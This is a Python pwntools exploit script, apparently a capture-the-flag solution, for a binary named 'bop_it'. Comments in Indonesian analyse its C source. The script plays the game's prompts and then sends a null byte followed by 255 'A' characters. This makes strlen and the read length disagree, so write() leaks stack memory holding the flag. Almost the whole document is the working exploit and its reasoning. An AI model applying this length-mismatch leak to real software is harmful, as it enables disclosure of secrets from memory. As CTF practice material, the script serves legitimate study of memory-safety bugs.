#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template bop_it
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'bop_it')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *main+376
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
"""
char guess[256];
guess[0] = c;
int guessLen = read(0, guess+1, 255)+1; //add to already entered char
    kalo c = null byte
    strlen guess = 0
    guessLen baca input baru setelah guess[0]
char flag[32];
if (strncmp(guess, flag, strlen(flag))) {
    char wrong[strlen(guess)+35];
        bisa 0 + 35, jadi wrong[35]
    wrong[0] = 0; //string is empty intially
    strncat(wrong, guess, guessLen);
        wrong diisi guess sebanyak guessLen
        jadi harus gedein guesLen
    strncat(wrong, " was wrong. Better luck next time!\n", 35);
    write(1, wrong, guessLen+35);
"""


io = start()

for i in range(5, 150):
    action = io.recvline()
    if b'Flag' in action:
        io.sendline(b"\x00" + b'A' *255)
        break
    else:
        io.sendline(action.decode("utf-8")[0])

io.interactive()